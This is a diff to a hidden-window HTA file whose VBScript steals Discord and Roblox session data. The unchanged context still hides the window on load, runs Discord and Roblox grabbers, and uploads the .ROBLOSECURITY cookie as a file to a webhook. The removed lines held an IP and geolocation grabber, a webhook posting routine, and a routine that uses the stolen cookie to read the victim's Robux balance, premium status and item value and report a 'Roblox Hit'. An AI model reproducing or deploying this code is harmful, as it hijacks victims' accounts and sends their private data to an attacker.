@@ -27,22 +27,7 @@ Function Ej(s)
     Ej=Replace(Ej,vbLf,Chr(92)&"n")
     Ej=Replace(Ej,vbTab,Chr(92)&"t")
 End Function
-Function RxF(src,pat)
-    Dim rx:Set rx=CreateObject("VBScript.RegExp"):rx.Pattern=pat:rx.IgnoreCase=True
-    Dim m:Set m=rx.Execute(src)
-    If m.Count>0 Then
-        If m(0).SubMatches.Count>0 Then RxF=m(0).SubMatches(0) Else RxF=m(0).Value
-    End If
-    Set rx=Nothing
-End Function
 
-Sub PostEmbed(t,d,c)
-    Dim DQ,j,h : DQ=Chr(34)
-    j="{" & DQ & "embeds" & DQ & ":[{" & DQ & "title" & DQ & ":" & DQ & Ej(t) & DQ & "," & DQ & "description" & DQ & ":" & DQ & Ej(d) & DQ & "," & DQ & "color" & DQ & ":" & c & "}]}"
-    Set h=CreateObject("MSXML2.ServerXMLHTTP.6.0"):h.SetOption 2,13056
-    h.Open "POST",WH,False:h.SetRequestHeader "Content-Type","application/json":h.Send j
-    Set h=Nothing
-End Sub
 
 Sub PostFile(fn,ct)
     Dim DQ,b,bd,h : DQ=Chr(34)
@@ -56,26 +41,10 @@ End Sub
 Sub Window_OnLoad()
     window.resizeTo 0,0
     window.moveTo -32000,-32000
-    GrabIP
     GrabDiscord
     GrabRoblox
 End Sub
 
-Sub GrabIP()
-    Dim xh,ip,ll,info
-    Set xh=CreateObject("MSXML2.ServerXMLHTTP.6.0"):xh.SetOption 2,13056
-    xh.Open "GET","https://api.ipify.org/",False:xh.Send
-    If xh.Status<>200 Then Exit Sub
-    ip=Trim(xh.responseText)
-    If Len(ip)<7 Then Exit Sub
-    xh.Open "GET","http://ip-api.com/line/"&ip&"?fields=country,regionName,city,isp",False:xh.Send
-    If xh.Status=200 Then
-        ll=Split(xh.responseText,vbLf)
-        info="IP: "&ip&" | "&ll(0)&" | "&ll(1)&" | "&ll(2)&" | "&ll(3)&" | PC: "&PC&" | USER: "&USER
-        PostEmbed "Target",info,3447003
-    End If
-    Set xh=Nothing
-End Sub
 
 Sub GrabDiscord()
     Dim psf,tf,raw
@@ -376,66 +345,8 @@ Sub GrabRoblox()
     If fso.FileExists(tf) Then fso.DeleteFile tf,True
     If raw<>"NOT_FOUND" And Len(raw)>10 Then
         PostFile "roblox_cookie.txt",raw
-        GrabRobloxInfo raw
     End If
 End Sub
 
-Sub GrabRobloxInfo(cookie)
-    Dim xh,json,uid,uname,robux,premium,created,ageDays,rapVal,rapJson,rapSum,pos,key,p,numStr,ch,createdDate,nl,desc
-    Set xh=CreateObject("MSXML2.ServerXMLHTTP.6.0"):xh.SetOption 2,13056
-
-    xh.Open "GET","https://www.roblox.com/mobileapi/userinfo",False
-    xh.SetRequestHeader "Cookie",".ROBLOSECURITY="&cookie
-    xh.Send
-    If xh.Status<>200 Then Set xh=Nothing:Exit Sub
-    json=xh.responseText
-
-    uid     =RxF(json,"""UserID"":(\d+)")
-    uname   =RxF(json,"""UserName"":""([^""]+)""")
-    robux   =RxF(json,"""RobuxBalance"":(\d+)")
-    premium =RxF(json,"""IsPremium"":(true|false)")
-    If uid="" Then Set xh=Nothing:Exit Sub
-    If robux="" Then robux="0"
-    If premium="" Then premium="false"
-
-    xh.Open "GET","https://users.roblox.com/v1/users/"&uid,False:xh.Send
-    ageDays="?"
-    If xh.Status=200 Then
-        created=RxF(xh.responseText,"""created"":""([^T]+)")
-        If created<>"" Then
-            On Error Resume Next
-            createdDate=CDate(created)
-            If Err.Number=0 Then ageDays=CStr(DateDiff("d",createdDate,Now()))
-            On Error GoTo 0
-        End If
-    End If
-
-    rapVal="0" : rapSum=0
-    xh.Open "GET","https://inventory.roblox.com/v1/users/"&uid&"/assets/collectibles?limit=100",False
-    xh.SetRequestHeader "Cookie",".ROBLOSECURITY="&cookie
-    xh.Send
-    If xh.Status=200 Then
-        rapJson=xh.responseText : pos=1 : key="""recentAveragePrice"":"
-        Do
-            p=InStr(pos,rapJson,key)
-            If p=0 Then Exit Do
-            p=p+Len(key) : numStr=""
-            Do While p<=Len(rapJson)
-                ch=Mid(rapJson,p,1)
-                If ch>="0" And ch<="9" Then numStr=numStr&ch:p=p+1 Else Exit Do
-            Loop
-            If numStr<>"" Then rapSum=rapSum+CLng(numStr)
-            pos=p
-        Loop
-        rapVal=CStr(rapSum)
-    End If
-    Set xh=Nothing
-
-    nl=Chr(10)
-    desc="**Username** | **Age** | **PC**"&nl&uname&" | "&ageDays&" Days | "&PC&nl&nl
-    desc=desc&"**Robux** | **Premium** | **RAP**"&nl&robux&" | "&premium&" | "&rapVal&nl&nl
-    desc=desc&"**Cookie**"&nl&"``Check attached file``"
-    PostEmbed "Roblox Hit",desc,16711680
-End Sub
 </script>
 </head><body></body></html>
